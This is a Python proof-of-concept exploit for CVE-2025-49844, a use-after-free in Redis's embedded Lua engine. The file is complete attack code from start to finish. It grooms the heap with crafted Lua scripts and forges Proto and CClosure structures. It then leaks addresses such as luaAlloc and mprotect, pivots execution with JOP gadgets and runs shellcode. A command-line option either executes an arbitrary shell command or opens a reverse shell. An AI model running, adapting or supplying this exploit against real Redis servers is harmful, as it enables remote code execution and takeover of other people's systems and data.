# CVE-2025-49844 proof-of-concept by saneki.

from __future__ import annotations
from argparse import ArgumentParser
import dataclasses
from dataclasses import dataclass, field
# from hexdump import hexdump
from io import StringIO
from ipaddress import IPv4Address
import logging
from redis import Redis
import random
import struct
from typing import cast, Any, Callable, List, Optional, Tuple

from .shared import (
    CClosure,
    ExploitState,
    ModuleProtocol,
    ShellcodeContext,
)
from .shellcode import (
    create_shellcode_body_command,
    create_shellcode_body_rshell,
)
from .util import optional_map, u32_le, u64_le

logger = logging.getLogger(__name__)

def import_target_modules() -> list[ModuleProtocol]:
    """Import modules for supported targets."""
    from . import (
        redis_8_2_1_alpine,
        redis_8_2_1_bookworm,
    )
    return [
        redis_8_2_1_alpine,
        redis_8_2_1_bookworm,
    ]

def u64_silly(value: int) -> int:
    return struct.unpack('<Q', struct.pack('B', value) * 8)[0]

def create_shellcode(context: ShellcodeContext, module: ModuleProtocol) -> Optional[Tuple[bytes, int]]:
    """Build shellcode for provided target module."""
    # Build the shellcode body.
    shellcode_body = context.body_callback(context)
    if shellcode_body is None:
        logger.error('Failed to build shellcode body')
        return None
    (shellcode, shellcode_body_entry) = shellcode_body

    # Calculate absolute address of shellcode body entry.
    shellcode_body_address = context.origin + shellcode_body_entry
    logger.info(f'Shellcode body address: 0x{shellcode_body_address:x}')

    return module.create_shellcode(context, shellcode, shellcode_body_address)

def lua_encode(data: bytes) -> str:
    with StringIO() as writer:
        for b in data:
            writer.write(f"\\{b:03}")
        return writer.getvalue()

def proto4stub() -> str:
    """
    Create a loadstring-able chunk that defines four inner functions.
    Only contains double-quotes for strings.
    """
    # Using function names longer than 7 bytes to prevent placement in 0x20 bin.
    # Upvalues are pushed back to front, so define desired upvalues[0] last.
    contents = ''
    contents += f'local empty000 = {{}}\\n'
    contents += f'empty000.source = nil\\n'
    contents += f'local hello000 = __redis__err__handler\\n'
    contents += f'local function h0000000 () local t0000000 = hello000; return empty000 end\\n'
    contents += f'local function i0000000 () local t0000000 = hello000; return empty000 end\\n'
    contents += f'local function j0000000 () local t0000000 = hello000; return empty000 end\\n'
    contents += f'local function k0000000 () local t0000000 = hello000; return empty000 end\\n'
    contents += f'local l0000000 = i0000000()\\n'
    # NOTE: Should we be pivoting RIP here? Why not I guess.
    contents += f'if type(l0000000) == "function" then return l0000000() end\\n'
    contents += f'return l0000000.source'
    return contents

def proto_encode_tstring(proto: Proto) -> str:
    # We want our string contents to be unique to avoid reuse, so randomize line values.
    proto.linedefined = random.randint(0, 0xFFFF_FFFF)
    proto.lastlinedefined = random.randint(0, 0xFFFF_FFFF)
    encoded = lua_encode(proto.build_into_tstring_contents())
    return encoded

@dataclass
class Proto(object):
    p_k: int = field(default=0)
    p_code: int = field(default=0)
    p_p_p: int = field(default=0)
    p_lineinfo: int = field(default=0)
    p_locvars: int = field(default=0)
    p_p_upvalues: int = field(default=0)
    p_source: int = field(default=0)
    sizeupvalues: int = field(default=0)
    sizek: int = field(default=0)
    sizecode: int = field(default=0)
    sizelineinfo: int = field(default=0)
    sizep: int = field(default=0)
    sizelocvars: int = field(default=0)
    linedefined: int = field(default=0)
    lastlinedefined: int = field(default=0)
    p_gclist: int = field(default=0)
    nups: int = field(default=0)
    numparams: int = field(default=0)
    is_vararg: int = field(default=0)
    maxstacksize: int = field(default=0)

    def build_into_tstring_contents(self) -> bytes:
        # By building into a `TString` to fit into the `Proto` bin, we sacrifice the ability
        # to control the `CommonHeader` and `k`.
        # If `tt` is examined, it will of course appear as a `TString`.
        b = self.build()
        next = struct.unpack('<Q', b[0x00:0x08])[0]
        if next != 0:
            logger.error('Proto::next is not non-null, not included in TString')
        p_k = struct.unpack('<Q', b[0x10:0x18])[0]
        if p_k != 0:
            logger.error('Proto::k is not non-null, not included in TString')
        # Null-terminator can take place after `maxstacksize` for `0x75` total size, same bin.
        # Return contents for TString creation.
        return b[0x18:]

    def build(self) -> bytes:
        data = b''
        # Append CommonHeader manually.
        data += b'\x00' * 8 # next
        data += b'\x09'     # tt
        data += b'\x02'     # marked
        data += b'\x00' * 6 # padding
        # Append following fields.
        data += struct.pack('<QQQQQQQIIIIIIIIQBBBB', *[
            self.p_k,
            self.p_code,
            self.p_p_p,
            self.p_lineinfo,
            self.p_locvars,
            self.p_p_upvalues,
            self.p_source,
            self.sizeupvalues,
            self.sizek,
            self.sizecode,
            self.sizelineinfo,
            self.sizep,
            self.sizelocvars,
            self.linedefined,
            self.lastlinedefined,
            self.p_gclist,
            self.nups,
            self.numparams,
            self.is_vararg,
            self.maxstacksize,
        ])
        assert(len(data) == 0x74)
        return data

@dataclass
class ScriptOptions(object):
    # Tuple of the opcodes address (`Proto::code` pointer)
    # and the number of opcodes (`Proto::sizecode`).
    opcodes: Tuple[int, int] = field(default=(0, 0))

    # Lua-encoded string with megabin contents.
    megabin: str = field(default='')

    # Desired address to leak as `const char*`.
    leak_addr: int = field(default=0)

    # `UpVal` address.
    upval_address: int = field(default=0)

    # Shellcode (Lua-encoded string).
    shellcode: str = field(default="")

    root_local_count: int = field(default=0)
    g0_prefix_count: int = field(default=6)
    g1_prefix_count: int = field(default=6)
    g2_prefix_count: int = field(default=6)
    g3_prefix_count: int = field(default=6)

    step: int = field(default=0)

    def increment(self):
        # Try adding a root local, then try adding an extra fake Proto before each Proto-4.
        match self.step % 5:
            case 0: self.root_local_count += 1
            case 1: self.g0_prefix_count += 1
            case 2: self.g1_prefix_count += 1
            case 3: self.g2_prefix_count += 1
            case 4: self.g3_prefix_count += 1
        self.step += 1

def create_script(options: ScriptOptions) -> str:
    def proto() -> str:
        (p_code, sizecode) = options.opcodes
        p_source = options.leak_addr

        # Determine the number of upvalues (this should be in ScriptOptions)
        # NOTE: By setting this to 1, we differentiate our Closure from the 15 others with nups=2.
        #       Thus we go in the 0x30 bin while they go in 0x38.
        nups = 1

        p = Proto(p_code=p_code, p_source=p_source, sizecode=sizecode, nups=nups)
        return proto_encode_tstring(p)

    # Get encoded UpVal address by itself.
    upval_addr = lua_encode(struct.pack('<Q', options.upval_address))

    script = f"""
-- Apparently zero-size string isn't loaded by default, get it out of the way.
local zerosizestr = ''

-- Shellcode.
local container = {{"{options.shellcode}"}}
if ARGV[1] == "dest" then
    return tostring(container)
end

local reserved = {{}}

local index = 0
local function myloader ()
    local myindex = index
    index = index + 1
    if myindex == 0 then
        -- Before parsing, f_parser tries to populate the ZIO buffer by calling `luaZ_lookahead`.
        -- We return nil here so that it tries to populate the buffer again while chunkname is in
        -- a collectable state in `luaX_setinput`.
        return nil
    elseif myindex == 1 then
        -- Sweep sweep sweep
        collectgarbage("collect")

        {'\n'.join([f'local y0_{i} = string.sub(" {proto()}", 2)' for i in range(options.g0_prefix_count)])}
        local g0 = loadstring('{proto4stub()}')

        {'\n'.join([f'local y1_{i} = string.sub(" {proto()}", 2)' for i in range(options.g1_prefix_count)])}
        local g1 = loadstring('{proto4stub()}')

        {'\n'.join([f'local y2_{i} = string.sub(" {proto()}", 2)' for i in range(options.g2_prefix_count)])}
        local g2 = loadstring('{proto4stub()}')

        {'\n'.join([f'local y3_{i} = string.sub(" {proto()}", 2)' for i in range(options.g3_prefix_count)])}
        local g3 = loadstring('{proto4stub()}')

        -- We want to call these after `load` finishes and we can mark.
        reserved[0] = g0
        reserved[1] = g1
        reserved[2] = g2
        reserved[3] = g3

        return 'return __redis__err__handler().source'
    end
end

-- Generate configurable number of root locals.
{'\n'.join([f'local L{i} = 0' for i in range(options.root_local_count)])}

-- Must use the default chunkname here, otherwise the string value will be added to `Proto::k`
-- of the `@user_script` prototype and thus end up marked during GC.
local f = load(myloader)

if ARGV[1] == "where" then
    -- Figure out next address in 0x200 bin.
    {'\n'.join([f'local u{i} = 0' for i in range((0x200 - 0x28) // 8)])}
    local function a () return {', '.join([f'u{i}' for i in range((0x200 - 0x28) // 8)])} end
    return tostring(a)
end
reserved['o'] = string.sub(" {options.megabin}", 2)

if ARGV[1] == "tostring" then
    return tostring(temp)
elseif ARGV[1] == "check" then
    return f()
end

-- Flood 0x30 bin with stale UpVal pointers in case we're pivoting RIP.
local s = 0
s = string.sub(" {upval_addr} 0000000", 2)
s = string.sub(" {upval_addr} 0000001", 2)
s = string.sub(" {upval_addr} 0000002", 2)
s = string.sub(" {upval_addr} 0000003", 2)
s = string.sub(" {upval_addr} 0000004", 2)
s = string.sub(" {upval_addr} 0000005", 2)
s = string.sub(" {upval_addr} 0000006", 2)
s = string.sub(" {upval_addr} 0000007", 2)
s = string.sub(" {upval_addr} 0000008", 2)
s = string.sub(" {upval_addr} 0000009", 2)
s = string.sub(" {upval_addr} 0000010", 2)
s = string.sub(" {upval_addr} 0000011", 2)
s = string.sub(" {upval_addr} 0000012", 2)
s = string.sub(" {upval_addr} 0000013", 2)
s = string.sub(" {upval_addr} 0000014", 2)
s = string.sub(" {upval_addr} 0000015", 2)
s = string.sub(" {upval_addr} 0000016", 2)
s = string.sub(" {upval_addr} 0000017", 2)
s = string.sub(" {upval_addr} 0000018", 2)
s = string.sub(" {upval_addr} 0000019", 2)

-- Mark mark mark
collectgarbage("collect")

local a = reserved[0]()
local b = reserved[1]()
local c = reserved[2]()
local d = reserved[3]()
if a ~= nil then return a end
if b ~= nil then return b end
if c ~= nil then return c end
if d ~= nil then return d end
return nil
    """

    # Remove all comment lines.
    script = '\n'.join([x for x in script.split('\n') if not x.lstrip().startswith('--')])

    return script

def parse_leaked_tostring_addr(contents: bytes) -> Optional[int]:
    if contents.startswith(b'function: '):
        return int(contents.lstrip(b'function: '), 16)
    if contents.startswith(b'table: '):
        return int(contents.lstrip(b'table: '), 16)
    return None

def perform_leak(r: Redis, options: ScriptOptions, address: int, count: int, argv: Optional[List[bytes | str]] = None) -> Optional[bytes]:
    options = dataclasses.replace(options, leak_addr=address)
    argv = argv if argv is not None else []
    data = b''
    failcount = 0
    while True:
        script = create_script(options)

        r.script_flush('SYNC')

        logger.info(f'Uploading script (leak: 0x{options.leak_addr:x})')
        result = cast(Any, r.eval(script, 0, *argv)) # type: ignore[arg-type]
        logger.info(f'Result: {result}')

        # Sometimes the leak may fail and the script returns nil (None).
        if result is None:
            failcount += 1
            if 3 < failcount:
                logger.error('Leak max failcount exceeded')
                return None
            logger.error('Leak failed, trying again')
            continue
        else:
            failcount = 0

        if not isinstance(result, bytes):
            logger.error(f'Failed to leak, returned non-bytes: 0x{options.leak_addr:x}')
            return None

        # Leak stops at null-terminator.
        result = result + b'\x00'

        data += result
        if count <= len(data):
            return data

        options.leak_addr += len(result)

def leaked_addr(data: bytes) -> Optional[int]:
    if 6 <= len(data):
        data += b'\x00' * (8 - len(data))
        return int(struct.unpack('<Q', data)[0])
    else:
        logger.error(f'Did not leak at least 6 bytes')
        return None

def info_extract_version(info: Any) -> Optional[Tuple[str, str]]:
    """Extract `redis_version` and `redis_build_id` INFO fields with strict type checking."""
    if not isinstance(info, dict):
        logger.error('INFO returned non-dict')
        return None
    if 'redis_version' not in info:
        logger.error('INFO missing "redis_version" key')
        return None
    if 'redis_build_id' not in info:
        logger.error('INFO missing "redis_build_id" key')
        return None
    redis_version = info['redis_version']
    if not isinstance(redis_version, str):
        logger.error('INFO: "redis_version" field is not str')
        return None
    redis_build_id = info['redis_build_id']
    if not isinstance(redis_build_id, str):
        logger.error('INFO: "redis_build_id" field is not str')
        return None
    return (redis_version, redis_build_id)

@dataclass
class Opcodes(object):
    opcodes: list[int]

    def __len__(self) -> int:
        return len(self.opcodes)

    def to_bytes_le(self) -> bytes:
        return b''.join([u32_le(o) for o in self.opcodes])

def perform(params: CommandParams | RshellParams):
    r = Redis(host='127.0.0.1', port=6379, password=None)

    # Import target modules.
    modules = import_target_modules()

    # Check Redis info.
    info = r.info()
    redis_version_fields = info_extract_version(info)
    if redis_version_fields is None:
        return
    (redis_version, redis_build_id) = redis_version_fields
    logger.info(f'Redis: {redis_version}; {redis_build_id}')

    # Identify target module by exact version and build ID match.
    targets = [(m, m.info()) for m in modules]
    matches = [(m, info) for (m, info) in targets if (info.redis_version, info.redis_build_id) == redis_version_fields]
    if len(matches) == 0:
        logger.error('Did not find exact match for Redis version and build ID')
        return
    (module, target) = matches[0]
    logger.info(f'Found: `{target.name}`')

    # Lua VM instructions that bypass `Proto::k` usage, generated from:
    # ```
    # local hello = __redis__err__handler
    # local function temp ()
    #     local n = hello()
    #     return n
    # end
    # ```
    opcodes_call_upvalue_0_and_return = Opcodes([
        0x0000_0004, # OP_GETUPVALUE(B=0)
        0x0080_801C, # OP_CALL(B=1, C=2)
        0x0100_001E, # OP_RETURN(B=2)
        0x0080_001E, # OP_RETURN(B=1)
    ])

    # Lua VM instructions for returning upvalue[4] (past 1 UpVal* and into `TString` contents).
    opcodes_return_upvalue_4 = Opcodes([
        0x0200_0004, # OP_GETUPVALUE(B=4)
        0x0100_001E, # OP_RETURN(B=2)
        0x0080_001E, # OP_RETURN(B=1)
    ])

    # Later on we hardcode assumptions of the opcodes byte sizes.
    assert(len(opcodes_call_upvalue_0_and_return.to_bytes_le()) == 0x10)
    assert(len(opcodes_return_upvalue_4.to_bytes_le()) == 0xC)

    # --- Step 0 ---

    # Build script.
    options = ScriptOptions()
    options.shellcode = "\\065" * (0x1000 - 0x19)
    script = create_script(options)

    # Flush scripts.
    # This reset the jemalloc tcache being used, which is very useful for consistent bin addressing.
    r.script_flush('SYNC')

    # Testing:
    # result = r.eval("local t = {}; local function f () return t end; return tostring(f)", 0)
    # print(result)
    # return

    logger.info('Uploading script (where)')
    result = r.eval(script, 0, *['where'])
    assert(isinstance(result, bytes))

    closure = parse_leaked_tostring_addr(result)
    if closure is None:
        logger.error('Failed to leak next 0x200-bin address')
        return
    logger.info(f'Closure: 0x{closure:x}')

    megabin_address = closure

    # Build TValue.
    tvalue_bytes = b''
    tvalue_bytes += u64_le(megabin_address + 0x50)
    tvalue_bytes += u32_le(6)
    tvalue_bytes += b'\x00' * 4
    assert(len(tvalue_bytes) == 0x10)

    # Build CClosure.
    cclosure = CClosure(p_function=u64_silly(0x41))
    cclosure_bytes = cclosure.build()
    assert(len(cclosure_bytes) == 0x28)

    # MegaBin layout:
    # * 0x00: TString head: 0x18
    # * 0x18: Opcodes (1): 0x10
    # * 0x28: Opcodes (2): 0xC
    # * 0x34: Padding: 0x4
    # * 0x38: TValue*: 0x8
    # * 0x40: TValue: 0x10
    # * 0x50: CClosure: 0x28
    # * 0x78: Padding: 0x187
    # * 0x1FF: TString null-term: 0x1
    megabin = b''
    megabin += opcodes_call_upvalue_0_and_return.to_bytes_le()
    megabin += opcodes_return_upvalue_4.to_bytes_le()
    megabin += b'\x00' * 4
    megabin += u64_le(megabin_address + 0x40)
    megabin += tvalue_bytes
    megabin += cclosure_bytes
    megabin += b'\x00' * 0x187
    assert(len(megabin) == 0x1E7)

    # `UpVal*` should point to 0x10-bytes behind `TValue*`.
    upvalue_address = megabin_address + 0x28

    opcodes_1_address = megabin_address + 0x18
    opcodes_2_address = megabin_address + 0x28

    # One correct way to obtain the Lua state would be to parse `tostring(_G)` and leak `Table::gclist` (`_G + 0x38`).
    # But it always seems to be at a consistent location relative to other Lua allocations.
    luastate = closure & 0xFFFF_FFFF_FFF0_0000
    logger.info(f'L State: 0x{luastate:x}')

    # Why not lol
    luaglobal = luastate + 0xB8
    logger.info(f'G State: 0x{luaglobal:x}')

    # --- Step 1 ---

    # Flush scripts, regenerate with this closure address.
    r.script_flush('SYNC')

    # Leak `global_State::frealloc` which should point to redis' `luaAlloc`.
    p_frealloc = (luaglobal + 0x10)

    # Regenerate script to point `Proto::code` to our opcodes.
    options.opcodes = (opcodes_1_address, len(opcodes_call_upvalue_0_and_return))
    options.megabin = lua_encode(megabin)
    options.upval_address = upvalue_address
    script = create_script(options)

    logger.info('Uploading script (check)')
    result = r.eval(script, 0, *['check'])
    assert(isinstance(result, bytes))

    logger.info(f'Received length: {len(result)}')
    match result:
        case b'':
            logger.warning('Empty response, YOLO')
        case b'=(load)':
            logger.error('Failed to UAF chunkname')
            return
        case data:
            address = leaked_addr(data)
            if address is None:
                logger.error('Failed to leak full address')
                return

            logger.info(f'Address: 0x{address:016x}')

            if address % 0x80 != 0:
                logger.error('Not 0x80-aligned, probably not Proto')
                return

            # Remember: We leaked entry[3].
            # Assume entry[1] is probably just -0x100 as usual.
            following_address = address + -0x100
            following_shifted = following_address & 0xFFFF_FFFF_FFFF_FCFF
            if following_shifted == address - 0x200:
                logger.error('Alignment will likely shift Proto* into parent and cause infinite recursion')
                return
            if following_shifted == following_address:
                logger.error('Proto* will likely not shift')
                return

            logger.info('Pointer may shift into our crafted Proto')

    # --- Step 2 ---

    luaAlloc_leak = perform_leak(r, options, p_frealloc - 0x18, 6, argv=['leak'])
    luaAlloc = optional_map(luaAlloc_leak, lambda x: leaked_addr(x))
    if luaAlloc is None:
        logger.error('Failed to leak luaAlloc')
        return

    # NOTE: If target module returns None instead of CoreAddrs, assume that the luaAlloc LSBits are incorrect.
    addrs = module.core_addrs(luaAlloc)
    if addrs is None:
        logger.error(f'luaAlloc LSBits not matching `{target.name}`: 0x{luaAlloc:016x}')
        return

    logger.info(f'Base: 0x{addrs.redis_base:016x}')
    logger.info(f'luaAlloc: 0x{addrs.luaAlloc:016x}')

    # mprotect isn't used directly by redis so this will hit the plt stub.
    # Not very stealthy but should be fine I guess.
    logger.info(f'mprotect: 0x{addrs.mprotect:016x}')

    # --- Step 3 ---

    # Could maybe avoid these extra leaks (script runs) with a few more JOP gadgets but I'm lazy.

    r.script_flush('SYNC')

    logger.info('Uploading script (dest)')
    result = r.eval(script, 0, *['dest'])
    assert(isinstance(result, bytes))
    table_addr = parse_leaked_tostring_addr(result)
    if table_addr is None:
        logger.error('Failed to parse Table tostring address')
        return

    logger.info(f'Table: 0x{table_addr:x}')

    table_array_leak = perform_leak(r, options, (table_addr + 0x20) - 0x18, 6, argv=['leak'])
    table_array_addr = optional_map(table_array_leak, lambda x: leaked_addr(x))
    if table_array_addr is None or table_array_addr == 0:
        logger.error('Failed to leak `Table::array` address')
        return
    logger.info(f'Table array: 0x{table_array_addr:x}')

    # Leak the address of shellcode TString.
    table_item_tstring_leak = perform_leak(r, options, table_array_addr - 0x18, 6, argv=['leak'])
    table_item_tstring_addr = optional_map(table_item_tstring_leak, lambda x: leaked_addr(x))
    if table_item_tstring_addr is None or table_item_tstring_addr == 0:
        logger.error('Failed to leak shellcode TString.')
        return
    logger.info(f'Shellcode TString: 0x{table_item_tstring_addr:x}')
    if table_item_tstring_addr % 0x1000 != 0:
        logger.error('Shellcode TString address is not 0x1000-aligned!')
        return

    # NOTE: For `redis:8.2.1` this address always ends with 0x7000 for me (`luastate + 0x87000`).
    # Ending with 0x0000 is indicative of a failed leak on the second address byte.
    if table_item_tstring_addr % 0x10000 == 0:
        logger.error(f'Shellcode TString address leak may have partially failed: 0x{table_item_tstring_addr:x}')
        return

    # Build shellcode with known origin.
    shellcode_origin = table_item_tstring_addr + 0x18

    # Shellcode body callback will depend on what the user specified.
    body_callback = params_to_shellcode_body_callback(params)

    shellcode_context = ShellcodeContext(
        origin=shellcode_origin,
        addrs=addrs,
        luastate=luastate,
        body_callback=body_callback,
    )
    shellcode_tuple = create_shellcode(shellcode_context, module)
    if shellcode_tuple is None:
        logger.error('Failed to create shellcode')
        return
    (unpadded_shellcode, shellcode_entry_offset) = shellcode_tuple

    # Calculate the actual code entry for the shellcode.
    shellcode_entry = shellcode_origin + shellcode_entry_offset
    logger.info(f'Shellcode entry: 0x{shellcode_entry:x}')

    # Pad shellcode and place as encoded string in `ScriptOptions`.
    # hexdump(unpadded_shellcode)
    shellcode = unpadded_shellcode + (b'\x00' * (0xFE7 - len(unpadded_shellcode)))
    assert(len(shellcode) == 0x1000 - 0x19)
    options.shellcode = lua_encode(shellcode)

    # --- Step 4 ---

    # Build state information for passing to target module.
    state = ExploitState(
        target=target,
        addrs=addrs,
        megabin_address=megabin_address,
        shellcode_entry=shellcode_entry,
        shellcode_page=table_item_tstring_addr,
    )

    # Target module is used to build specifically the CClosure bytes
    # and the following JOP data bytes.
    (cclosure_bytes, jopdata) = module.build_pivot_payload(state)

    # MegaBin layout:
    # * 0x00: TString head: 0x18
    # * 0x18: Opcodes (1): 0x10
    # * 0x28: Opcodes (2): 0xC
    # * 0x34: Padding: 0x4
    # * 0x38: TValue*: 0x8
    # * 0x40: TValue: 0x10
    # * 0x50: CClosure: 0x28
    # * 0x78: <JOP details>
    # * 0x1FF: TString null-term: 0x1
    # Size: 0x200
    megabin = b''
    megabin += opcodes_call_upvalue_0_and_return.to_bytes_le()
    megabin += opcodes_return_upvalue_4.to_bytes_le()
    megabin += b'\x00' * 4
    megabin += u64_le(megabin_address + 0x40)
    megabin += tvalue_bytes
    megabin += cclosure_bytes
    assert(len(megabin) == (0x78 - 0x18))

    megabin += jopdata

    remaining = (0x1FF - 0x78) - len(jopdata)
    assert(0 <= remaining)
    megabin += b'\x00' * remaining
    assert(len(megabin) == 0x1E7)

    # --- Step 5 ---

    # Update for megabin with JOP details.
    options.megabin = lua_encode(megabin)

    # Rebuild script to run Opcodes 2.
    options.opcodes = (opcodes_2_address, len(opcodes_return_upvalue_4))
    script = create_script(options)

    r.script_flush('SYNC')

    logger.info('Uploading script (upval)')
    result = r.eval(script, 0, *['upval'])
    if result != 1:
        logger.error(f'Unexpected final output: {result}')

@dataclass
class CommandParams(object):
    command: bytes

@dataclass
class RshellParams(object):
    host: IPv4Address
    port: int

def params_to_shellcode_body_callback(params: CommandParams | RshellParams) -> Callable[[ShellcodeContext], Optional[Tuple[bytes, int]]]:
    match params:
        case CommandParams():
            def body_callback(context: ShellcodeContext) -> Optional[Tuple[bytes, int]]:
                return create_shellcode_body_command(context, params.command)
            return body_callback
        case RshellParams():
            def body_callback(context: ShellcodeContext) -> Optional[Tuple[bytes, int]]:
                endpoint = (params.host, params.port)
                return create_shellcode_body_rshell(context, endpoint)
            return body_callback
        case _: raise NotImplementedError

def get_parser() -> ArgumentParser:
    parser = ArgumentParser()
    subparsers = parser.add_subparsers(dest='subcommand')

    command_parser = subparsers.add_parser('command', help='one-way command')
    command_parser.add_argument('command', help='shell command to run')

    rshell_parser = subparsers.add_parser('rshell', help='reverse shell')
    rshell_parser.add_argument('-l', '--host', type=str, default='127.0.0.1')
    rshell_parser.add_argument('-p', '--port', type=int, default=4444)

    return parser

class LogFormatter(logging.Formatter):
    """Logging formatter for `[+] ...` and `[!] ...` style of messages."""
    def format(self, record: logging.LogRecord) -> str:
        token = None
        match record.levelno:
            case x if x <= logging.INFO: token = '+'
            case x if x <= logging.CRITICAL: token = '!'
            case _: token = '?'
        formatted = super().format(record)
        return f'[{token}] {formatted}'

def get_custom_logging_handler(level: int) -> logging.Handler:
    formatter = LogFormatter(fmt='%(message)s')
    handler = logging.StreamHandler()
    handler.level = level
    handler.setFormatter(formatter)
    return handler

def main():
    handler = get_custom_logging_handler(level=logging.INFO)
    logging.basicConfig(level=logging.INFO, handlers=[handler])

    args = get_parser().parse_args()
    match args.subcommand:
        case 'command':
            command = cast(str, args.command).encode()
            params = CommandParams(command=command)
            perform(params)
        case 'rshell':
            host = IPv4Address(cast(str, args.host))
            port = cast(int, args.port)
            params = RshellParams(host=host, port=port)
            perform(params)
        case None:
            logger.error('No subcommand provided')
        case _: raise NotImplementedError

if __name__ == "__main__":
    main()
